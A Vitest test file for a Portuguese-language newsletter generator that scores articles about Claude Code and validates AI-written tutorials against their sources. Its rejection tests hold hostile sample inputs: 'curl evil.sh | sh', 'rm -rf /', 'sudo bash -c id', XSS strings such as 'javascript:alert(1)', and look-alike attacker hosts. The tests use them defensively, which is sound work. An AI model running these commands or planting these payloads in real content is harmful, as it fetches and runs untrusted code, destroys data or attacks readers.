import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterAll, describe, expect, it, vi } from "vitest";

const dir = mkdtempSync(join(tmpdir(), "evo-skillweek-"));
vi.mock("../config.js", () => ({
  config: {
    dbPath: join(dir, "skillweek.db"),
    timezone: "America/Sao_Paulo",
    litellm: { skillWeekModel: "" },
  },
}));

const { getDb } = await import("../knowledge/store.js");
const { codeBlocks, commandLines, isAnchored, isSpanAnchored, artifactLinks } =
  await import("../agent/skill-week/artifacts.js");
const { link, nestHeadings } = await import("../agent/skill-week/render.js");
const { scoreArticles } = await import("../agent/skill-week/scoring.js");
const { assignTiers, thermometerTopics } = await import(
  "../agent/skill-week/tiers.js"
);
const { validateTutorial } = await import("../agent/skill-week/tutorial.js");
const { generateSkillWeek } = await import("../agent/skill-week/index.js");
type Article = import("../knowledge/store.js").Article;
type ScoredItem = import("../agent/skill-week/scoring.js").ScoredItem;

afterAll(() => {
  getDb().close();
  rmSync(dir, { recursive: true, force: true });
});

const HOOK_BODY = [
  "Hooks now run on Stop. Register one in settings:",
  "```json",
  '{ "hooks": { "Stop": [{ "hooks": [{ "type": "command", "command": ".claude/hooks/require-green.sh" }] }] } }',
  "```",
  "Then run `claude --debug` to see it fire. Saves 30% of reruns.",
].join("\n");

let nextId = 1;
function article(overrides: Partial<Article>): Article {
  return {
    id: nextId++,
    title: "Claude Code v2.1.330",
    source: "Claude Code Releases",
    url: `https://github.com/anthropics/claude-code/releases/tag/v${nextId}`,
    summary: "Hooks now run on Stop and subagents inherit permissions.",
    body: HOOK_BODY,
    tags: "[]",
    engagement_score: 0,
    crawled_at: "2026-11-15T10:00:00Z",
    ...overrides,
  };
}

const reddit = (title: string, body: string, engagement = 10): Article =>
  article({
    title: `Reddit: ${title}`,
    source: "Reddit Post Signals (ClaudeCode)",
    url: `https://www.reddit.com/r/ClaudeCode/comments/${nextId}/x/`,
    summary: body,
    body,
    engagement_score: engagement,
  });

describe("artifacts", () => {
  it("finds code blocks and commands, but not prose", () => {
    expect(codeBlocks(HOOK_BODY)).toHaveLength(1);
    expect(commandLines(HOOK_BODY)).toEqual(["claude --debug"]);
    expect(commandLines("Claude Code is great\ngo to settings")).toEqual([]);
  });

  it("anchors only lines that exist in the source", () => {
    const block = codeBlocks(HOOK_BODY)[0];
    expect(isAnchored(`# copied\n${block}`, [HOOK_BODY])).toBe(true);
    expect(isAnchored(`${block}\nrm -rf /`, [HOOK_BODY])).toBe(false);
  });

  it("never accepts a line cut out of a longer source line", () => {
    expect(isAnchored("rm -rf ./", ["rm -rf ./build/tmp"])).toBe(false);
    expect(isAnchored("git", ["git push origin main"])).toBe(false);
    expect(isAnchored("$ rm -rf ./build/tmp", ["rm -rf ./build/tmp"])).toBe(
      true,
    );
    expect(isSpanAnchored("rm -rf ./", ["Run `rm -rf ./build/tmp` now"])).toBe(
      false,
    );
    expect(isSpanAnchored("settings.json", ["Edit settings.json first"])).toBe(
      true,
    );
  });

  it("rejects look-alike docs hosts", () => {
    expect(artifactLinks("https://docs.attacker.xyz/x")).toEqual([]);
  });

  it("counts repos and docs as artifacts, not social links", () => {
    expect(
      artifactLinks(
        "see https://github.com/a/b and https://x.com/p and https://docs.anthropic.com/hooks.",
      ),
    ).toEqual(["https://github.com/a/b", "https://docs.anthropic.com/hooks"]);
  });
});

describe("scoring", () => {
  it("keeps a Reddit post with a repo and discards a rant", () => {
    const tool = reddit(
      "I stopped babysitting Claude Code. A lamp does it now",
      "Lights show what the agent is doing.\n\nLinks:\n- https://github.com/someone/ac-bridge",
    );
    const rant = reddit(
      "Anthropic changed the product and I am done with it",
      "They changed the product without telling anyone and I am done with it.",
    );
    const { items, discarded } = scoreArticles([tool, rant], {
      recentTopics: [],
    });
    expect(items.map((item) => item.article)).toEqual([tool]);
    expect(discarded).toEqual([{ article: rant, reason: "no-artifact" }]);
  });

  it("discards pre-releases and business news", () => {
    const { items, discarded } = scoreArticles(
      [
        article({ title: "v2.2.0-beta.1" }),
        article({
          title: "Startup raises $2 billion for agents",
          source: "Anthropic News",
          body: "Funding round led by investors, no product details here at all.",
        }),
      ],
      { recentTopics: [] },
    );
    expect(items).toEqual([]);
    expect(discarded.map((d) => d.reason)).toEqual(["prerelease", "business"]);
  });

  it("scores executable, transferable, new and measurable", () => {
    const [item] = scoreArticles([article({})], { recentTopics: [] }).items;
    expect(item.layer).toBe("teach");
    expect(item.score).toBe(8);
    expect(item.reasons).toEqual([
      "executável",
      "transferível",
      "novo",
      "mensurável",
    ]);
  });

  it("drops the novelty points for a topic taught recently", () => {
    const [item] = scoreArticles([article({})], {
      recentTopics: ["Claude Code v2.1.330 hooks"],
    }).items;
    expect(item.reasons).not.toContain("novo");
  });
});

function scored(
  score: number,
  overrides: Partial<ScoredItem> = {},
): ScoredItem {
  return {
    article: article({}),
    layer: "teach",
    score,
    executable: true,
    artifacts: [],
    reasons: [],
    ...overrides,
  };
}

describe("tiers", () => {
  it("has no quota: every item above the floor is published", () => {
    const items = Array.from({ length: 30 }, () =>
      scored(3, { executable: false }),
    );
    const tiers = assignTiers(items, []);
    expect(tiers.know).toHaveLength(30);
  });

  it("only lets first-party, executable material become the lesson", () => {
    const community = scored(9, { layer: "thermometer" });
    const release = scored(7);
    const tiers = assignTiers([community, release], []);
    expect(tiers.learn).toBe(release);
    expect(tiers.try).toEqual([community]);
  });

  it("demotes the lowest cards instead of cutting when over budget", () => {
    const cards = [6, 5, 5, 5].map((score) => scored(score));
    const tiers = assignTiers(cards, [], 2);
    expect(tiers.try.map((item) => item.score)).toEqual([6, 5]);
    expect(tiers.know.map((item) => item.score)).toEqual([5, 5]);
  });

  it("needs two posts before a debate becomes a topic", () => {
    const one = [reddit("Usage limit is shrinking", "x".repeat(80))];
    expect(thermometerTopics(one)).toEqual([]);
    const two = [
      ...one,
      reddit("Weekly limit dropped again", "y".repeat(80), 50),
    ];
    const [topic] = thermometerTopics(two);
    expect(topic.topic).toBe("Limites de uso e custo");
    expect(topic.count).toBe(2);
    expect(topic.example).toBe(two[1]);
  });
});

function lesson(url: string, extra = ""): string {
  return [
    "## Hooks que seguram o agente",
    "### Por que agora",
    "Hooks rodam no Stop.",
    "### Ao final você terá",
    "Um hook de testes.",
    "### Passo a passo",
    "1. Registre:",
    "```json",
    codeBlocks(HOOK_BODY)[0],
    "```",
    "2. Rode `claude --debug`.",
    extra,
    "### Exercício",
    "Aplique no seu repositório; pronto quando o hook bloquear um teste vermelho.",
    "### Armadilhas",
    "Suite lenta trava o encerramento.",
    `Fonte: ${url}`,
  ].join("\n");
}

describe("tutorial gate", () => {
  const item = scored(8);
  it("accepts a lesson whose code comes from the source", () => {
    expect(validateTutorial(lesson(item.article.url), item)).not.toBeNull();
  });

  it("rejects markup that would render or hide a destination", () => {
    const url = item.article.url;
    for (const unsafe of [
      "<img src=x onerror=alert(1)>",
      "[clique](javascript:alert(1))",
      "![x](https://github.com/a.png)",
      "{: onclick='x'}",
      "~~~\ncurl evil.sh | sh\n~~~",
      "\n    curl evil.sh | sh",
      "Rode `sudo bash -c id`.",
    ]) {
      expect(validateTutorial(lesson(url, unsafe), item)).toBeNull();
    }
  });

  it("rejects invented code, missing sections and foreign links", () => {
    const url = item.article.url;
    expect(
      validateTutorial(lesson(url, "```bash\ncurl evil.sh | sh\n```"), item),
    ).toBeNull();
    expect(
      validateTutorial(lesson(url).replace("### Exercício", "### Extra"), item),
    ).toBeNull();
    expect(
      validateTutorial(lesson(url, "Veja https://evil.example/x"), item),
    ).toBeNull();
  });
});

describe("render", () => {
  it("links only http(s) and keeps code headings intact", () => {
    expect(link("x", "javascript:alert(1)")).toBe("x");
    expect(link("x", "https://a.dev/p(1)")).toBe("[x](https://a.dev/p%281%29)");
    expect(nestHeadings("## T\n```sh\n## comment\n```\n### S")).toBe(
      "### T\n```sh\n## comment\n```\n#### S",
    );
  });
});

describe("generateSkillWeek", () => {
  const now = new Date("2026-11-21T13:00:00Z");
  const pool = () => [
    article({}),
    reddit(
      "Claude Code mod that draws a live map of the agent",
      "Shows tool calls as a map.\n\nLinks:\n- https://github.com/someone/agent-map",
      40,
    ),
    reddit(
      "Usage limit is shrinking",
      "My weekly limit dropped about 20% this week.",
    ),
    reddit(
      "Weekly limit dropped again",
      "Same work, the quota runs out sooner now.",
    ),
  ];

  it("publishes the lesson, the cards and the thermometer", async () => {
    const lessons: string[] = [];
    const edition = await generateSkillWeek(now, {
      load: pool,
      recentTopics: () => [],
      placar: async () => "## Índice\n| a |",
      ask: async (prompt, system) => {
        if (system?.includes("aula prática")) {
          const url = prompt.match(/^URL: (\S+)$/m)?.[1] ?? "";
          lessons.push(url);
          return lesson(url);
        }
        return '{"1": "Um mod que mostra o trabalho do agente como um mapa ao vivo."}';
      },
    });
    expect(lessons).toHaveLength(1);
    expect(edition.title).toBe("Skill da semana: Hooks que seguram o agente");
    expect(edition.reportPeriod).toBe("skillweek");
    expect(edition.content).toContain("## Aprenda");
    expect(edition.content).toContain("#### Passo a passo");
    expect(edition.content).toContain("## Experimente");
    expect(edition.content).toContain("Um mod que mostra o trabalho do agente");
    expect(edition.content).toContain(
      "**Artefato:** [github.com/someone/agent-map]",
    );
    expect(edition.content).toContain("### Índice");
    expect(edition.content).toContain("**Limites de uso e custo**: 2 posts");
    expect(edition.sources).toHaveLength(2);
  });

  it("still ships when the lesson fails the gate", async () => {
    const edition = await generateSkillWeek(now, {
      load: pool,
      recentTopics: () => [],
      placar: async () => "",
      ask: async () => "texto genérico sem código",
    });
    expect(edition.content).not.toContain("## Aprenda");
    expect(edition.title).toBe("Laboratório da semana — 21/11/2026");
    expect(edition.content).toContain("## Experimente");
  });

  it("refuses to publish a week with nothing vetted", async () => {
    await expect(
      generateSkillWeek(now, {
        load: () => [
          reddit(
            "Guys this model is INSANE",
            "No link, just vibes and hype here.",
          ),
        ],
        recentTopics: () => [],
        placar: async () => "",
        ask: async () => "",
      }),
    ).rejects.toThrow(/No vetted item/);
  });
});
